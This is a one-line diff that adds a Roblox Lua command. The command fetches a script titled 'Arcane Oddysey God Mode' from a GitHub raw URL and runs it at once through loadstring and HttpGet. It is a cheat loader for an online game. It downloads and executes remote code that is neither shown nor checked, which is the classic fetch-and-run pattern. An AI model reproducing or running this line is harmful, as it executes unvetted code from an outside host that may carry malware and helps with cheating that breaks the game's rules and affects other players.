@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/0ho1/scripts/main/Arcane%20Oddysey%20God%20Mode'))()
